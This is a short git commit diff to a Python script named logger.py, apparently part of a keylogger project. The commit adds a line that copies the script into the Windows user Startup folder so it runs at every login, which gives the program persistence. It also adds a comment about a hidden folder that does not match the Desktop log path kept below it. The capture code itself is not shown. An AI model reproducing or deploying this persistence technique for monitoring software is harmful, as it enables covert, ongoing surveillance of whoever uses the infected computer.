4ca1696a4e48d3075270716e6002c80ff7521e24
Ahmed <ahmedhamedaly19@gmail.com>
2020-11-17 22:03:11 +0000

    save logger to startup

--- logger.py
+++ logger.py
@@ -5,7 +5,10 @@ import logging
 from shutil import copyfile
 
 username = os.getlogin()
+# Moved to hidden folder
 logging_dir = f'C:/Users/{username}/Desktop'
+
+copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/logger.py')
 
 logging.basicConfig(filename=f'{logging_dir}/mylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
